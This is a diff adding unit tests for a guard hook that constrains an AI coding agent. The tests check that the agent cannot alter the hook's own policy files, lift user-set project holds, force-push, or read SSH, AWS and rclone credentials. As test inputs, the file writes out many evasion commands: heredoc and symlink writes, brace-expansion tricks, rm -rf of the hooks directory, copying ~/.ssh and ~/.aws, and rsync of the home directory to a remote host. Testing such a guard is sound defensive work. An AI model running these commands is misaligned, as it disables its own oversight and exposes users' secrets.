@@ -260,7 +260,7 @@ class PolicyFilesViaBash(unittest.TestCase):
     def test_every_way_of_changing_the_policy_files_is_denied(self):
         h = str(hg.HERE)
         for cmd in (f"echo '{{}}' > {h}/holds.state.json", f"echo x >> {h}/holds.json", f"rm {h}/holds.json",
-                    f"sed -i '' s/yates/zzz/ {h}/holds.json", f"cp /tmp/e {h}/holds.json", f"mv /tmp/e {h}/holds.json",
+                    f"sed -i '' s/a/b/ {h}/holds.json", f"cp /tmp/e {h}/holds.json", f"mv /tmp/e {h}/holds.json",
                     f"python3 -c \"open('{h}/holds.json','w').write('{{}}')\"", f"tee {h}/holds.state.json",
                     f"cd {h} && rm holds.json", f"cd {h} && echo '{{}}' > holds.state.json",
                     f"cd {h} && python3 -c 'import os'", f"rm {h}/holds_guard.py",
@@ -270,7 +270,7 @@ class PolicyFilesViaBash(unittest.TestCase):
     def test_reading_the_policy_and_using_holds_py_are_allowed(self):
         h = str(hg.HERE)
         for cmd in (f"cat {h}/holds.json", f"python3 {h}/holds.py status", f"grep yates {h}/holds.json",
-                    f"python3 {h}/holds.py lift yates --source 'user:a/b \"x\"'", "sed -i '' s/a/b/ /tmp/other/holds.json"):
+                    "sed -i '' s/a/b/ /tmp/other/holds.json", f"python3 {h}/wal_note.py --event status --note x"):
             self.assertIsNone(verdict(bash(cmd)), cmd)
 
 
@@ -396,6 +396,143 @@ class GoodQAProjects(unittest.TestCase):
         import re
         self.assertTrue(re.fullmatch(install.HOLDS_TOOLS, "mcp__claude_ai_GoodQA__create_issue"))
         self.assertTrue(re.fullmatch(install.HOLDS_TOOLS, "Bash"))
+
+
+class RoundTwo(unittest.TestCase):
+    """Findings of the second independent review (delta of 6c2ebb2)."""
+
+    H = str(hg.HERE)
+
+    def test_cp_rm_mv_into_or_under_the_hooks_dir_are_denied(self):  # F1
+        H = self.H
+        for cmd in (f"cp /tmp/evil/holds_guard.py {H}/", f"cp /tmp/evil/holds.py {H}", f"cp -t {H} /tmp/evil/holds_guard.py",
+                    f"mv /tmp/evil/holds.state.json {H}/", f"rm {H}/*.json", f"rm {H}/holds.*", f"rm {H}/holds.js[o]n",
+                    f"cd {H} && rm holds*", f"cd {H} && find . -name 'holds*' -delete", f"cd {H} && find . -exec rm {{}} +",
+                    f"rm -rf {H}", f"mv {H} {H}.bak", f"pushd {H} && echo '{{}}' > holds.json",
+                    f"cd {H} && python3 - <<'PY'\nopen('holds.json','w').write('{{}}')\nPY",
+                    f"python3 -c \"import os;h=os.path.expanduser('~/.claude/hooks');open(h+'/holds.json','w')\"",
+                    f"cd /tmp && ln -s {H} /tmp/l_probe && echo x > /tmp/l_probe/holds_guard.py", f"rm {H}/provenance.py",
+                    f"echo x > {H}/safe_input.py", f"touch {H}/newhook.py", f"tee {H}/x.py", f"chmod 777 {H}",
+                    f"mkdir {H}/sub"):
+            self.assertIn(verdict(bash(cmd)), ("policy-file",), cmd)
+
+    def test_heredoc_code_that_names_the_hooks_dir_is_denied_from_any_cwd(self):  # F1
+        body = "import os\\nopen(os.path.expanduser('~/.claude/hooks/holds.json'), 'w')"
+        for cmd in (f"cd /tmp && python3 - <<'PY'\n{body}\nPY", f"cd /tmp && python3 <<EOF\n{body}\nEOF",
+                    f"cd /tmp && bash <<'SH'\nrm {self.H}/holds.json\nSH"):
+            self.assertEqual(verdict(bash(cmd)), "policy-file", cmd)
+        self.assertIsNone(verdict(bash("cd /tmp && python3 - <<'PY'\nprint(1)\nPY")))
+
+    def test_settings_json_cannot_be_edited(self):  # F1
+        for name in ("settings.json", "settings.local.json"):
+            path = str(hg.HERE.parent / name)
+            self.assertEqual(verdict(tool("Edit", file_path=path)), "policy-file")
+            self.assertEqual(verdict(tool("Write", file_path=path)), "policy-file")
+            self.assertEqual(verdict(bash(f"sed -i '' s/a/b/ {path}")), "policy-file")
+            self.assertEqual(verdict(bash(f"echo {{}} > {path}")), "policy-file")
+            self.assertIsNone(verdict(tool("Read", file_path=path)))
+
+    def test_any_installed_hook_file_is_agent_immutable_but_runnable_and_readable(self):  # F1
+        H = self.H
+        self.assertEqual(verdict(tool("Write", file_path=f"{H}/provenance.py")), "policy-file")
+        for cmd in (f"python3 {H}/wal_note.py --event status --note hi", f"cat {H}/provenance.py", f"ls {H}",
+                    f"grep -n lift {H}/holds.py", f"python3 {H}/commit_policy.py check-message --file /tmp/m.txt"):
+            self.assertIsNone(verdict(bash(cmd)), cmd)
+
+    def test_agent_cannot_lift_a_hold_and_an_unrelated_human_message_cannot_either(self):  # F2
+        H = self.H
+        self.assertEqual(verdict(bash(f"python3 {H}/holds.py lift yates --source 'user:a/b \"x\"'")), "lift-by-agent")
+        self.assertEqual(verdict(bash(f"cd {H} && python3 holds.py lift yates --source x")), "lift-by-agent")
+        self.assertIsNone(verdict(bash(f"python3 {H}/holds.py status")))
+        tmp = tempfile.TemporaryDirectory()
+        self.addCleanup(tmp.cleanup)
+        state, policy = Path(tmp.name) / "s.json", Path(tmp.name) / "p.json"
+        policy.write_text(json.dumps(POLICY))
+        uuid_s, uuid_m = "11111111-1111-1111-1111-111111111111", "22222222-2222-2222-2222-222222222222"
+        finder = lambda session, text: [{"uuid": uuid_m}]  # noqa: E731 - a transcript that confirms every excerpt
+        for words in ("please fix the login page colors", "lift the hold please", "the yates repo is ready"):
+            with self.assertRaises(ValueError, msg=words):
+                holds.lift("yates", f'user:{uuid_s}/{uuid_m} "{words}"', policy, state, finder)
+        self.assertFalse(state.exists())
+        holds.lift("yates", f'user:{uuid_s}/{uuid_m} "yates hold: lift it"', policy, state, finder)
+        self.assertTrue(state.exists())
+        # the guard re-applies the same rule to a hand-edited state entry
+        state.write_text(json.dumps({"lifted": {"petfiliate": {"source_uuid": uuid_m, "session": uuid_s,
+                                                                "excerpt": "yates hold: lift it"}}}))
+        orig = hg.STATE
+        hg.STATE = state
+        try:
+            self.assertEqual(hg.lifted_ids(finder), set())
+        finally:
+            hg.STATE = orig
+
+    def test_oversized_command_and_deadline_deny_instead_of_timing_out(self):  # F3
+        code, decision, reason = run_guard(json.dumps(bash("echo " + "x" * 70000 + "; cat ~/yates/a")))
+        self.assertEqual((code, decision), (0, "deny"))
+        self.assertIn("longer than", reason)
+        self.assertIn("failing closed", reason)
+        code, decision, _ = run_guard(json.dumps(bash(";ls" * 15000 + "; cat ~/yates/a")))  # under the cap, many segments
+        self.assertEqual((code, decision), (0, "deny"))
+
+    def test_force_push_flag_clusters(self):  # F4
+        for cmd in ("git push -fu origin x", "git push -uf origin x", "git push origin x -f", "git push --force-with-lease",
+                    "git push origin +x:y"):
+            self.assertEqual(verdict(bash(cmd)), "force-push", cmd)
+        self.assertIsNone(verdict(bash("git push -u origin feat")))
+        self.assertIsNone(verdict(bash("git push --follow-tags origin feat")))
+
+    def test_commit_and_pr_text_may_name_a_held_project(self):  # F5
+        for cmd in ("git commit -m 'docs: yates hold'", "git commit -m 'x' -m 'user hold on Petfiliate'",
+                    "gh pr create --body 'user hold on Petfiliate'", "gh issue create --title 'petfiliate sweep'",
+                    "git log --grep=yates", "git log --grep yates --oneline", "git commit -F /tmp/m.txt",
+                    "git commit -m \"$(cat <<'EOF'\nfix: skip yates items\n\nssh yates-cloud is held\nEOF\n)\"",
+                    "cat <<'EOF' > /tmp/note.txt\nssh yates-cloud\nEOF"):
+            self.assertIsNone(verdict(bash(cmd)), cmd)
+        for cmd in ("git clone https://github.com/o/yates-cloud.git", "git -C yates-cloud status",
+                    "git -C /srv/optinrouter log", "git fetch yates-host:repo", "gh repo clone o/petfiliate"):
+            self.assertEqual(verdict(bash(cmd)), "hold", cmd)
+
+    def test_bare_relative_names_that_exist_and_ancestor_directories(self):  # F6, F7
+        with tempfile.TemporaryDirectory() as d:
+            root = Path(d).resolve()
+            (root / "yates-x").mkdir()
+            for cmd in ("ls yates-x", "rm -rf yates-x", "tar czf a.tgz yates-x", "find yates-x", "grep -r foo yates-x"):
+                self.assertEqual(verdict({**bash(cmd), "cwd": str(root)}), "hold", cmd)
+            self.assertIsNone(verdict({**bash("ls other"), "cwd": str(root)}))
+        for cmd in ("tar czf a.tgz ~", "cp -r ~ /tmp/x", "grep -r BEGIN ~", "find ~ -name 'id_*'", "rsync -a ~/ host:/"):
+            self.assertEqual(verdict(bash(cmd)), "protected-path", cmd)
+        for cmd in ("find ~/.claude -name x", "grep -r x ~/projects", "ls ~"):
+            self.assertIsNone(verdict(bash(cmd)), cmd)
+
+    def test_credential_directories_and_odd_key_names(self):  # F8
+        for cmd in ("cat ~/.ssh/work_key", "cat ~/.ssh/github_deploy", "cat ~/.ssh/authorized_keys", "cp -r ~/.aws /tmp/a",
+                    "cat ~/.config/rclone/rclone.conf", "cp -r ~/.config/rclone /tmp/r"):
+            self.assertEqual(verdict(bash(cmd)), "protected-path", cmd)
+        self.assertEqual(verdict(tool("Read", file_path="/Users/x/.ssh/work_key")), "protected-path")
+        for cmd in ("cat ~/.ssh/id_ed25519.pub", "cat ~/.ssh/known_hosts", "cat ~/.ssh/config", "ssh -i ~/.ssh/work_key dev2 uptime"):
+            self.assertIsNone(verdict(bash(cmd)), cmd)
+
+    def test_brace_expansion_continuations_and_echo_into_xargs(self):  # F9
+        for cmd in ("cat ~/.ss{h,}/id_rsa", "ls /srv/ya{t,x}es", "cat ~/ya\\\ntes/x", "echo ~/.ssh/id_rsa | xargs cat",
+                    "printf '%s' /srv/yates-cloud/x | xargs rm", "cat /srv/{yates-cloud,other}/x"):
+            self.assertIn(verdict(bash(cmd)), ("hold", "protected-path"), cmd)
+        self.assertIsNone(verdict(bash("echo {a,b}")))
+        with self.assertRaises(hg.Bad):
+            hg.brace_expand("{a,b}{c,d}{e,f}{g,h}{i,j}{k,l}{m,n}")
+
+    def test_type_gaps(self):  # F11
+        for payload in ({"tool_name": "Bash", "tool_input": {"command": "ls"}, "cwd": 5}, {"tool_input": {"command": "ls"}},
+                        {"tool_name": "", "tool_input": {}}):
+            self.assertEqual(run_guard(json.dumps(payload))[:2], (0, "deny"), payload)
+
+    def test_held_cwd_message_and_file_tools_with_absolute_paths(self):  # F13
+        with tempfile.TemporaryDirectory() as d:
+            root = Path(d).resolve()
+            (root / "yates-cloud").mkdir()
+            held_cwd = str(root / "yates-cloud")
+            self.assertIn("start the session in another directory",
+                          hg.decide({**bash("ls"), "cwd": held_cwd}, POLICY, set())[1])
+            self.assertIsNone(verdict({**tool("Read", file_path="/etc/hosts"), "cwd": held_cwd}))
 
 
 if __name__ == "__main__":
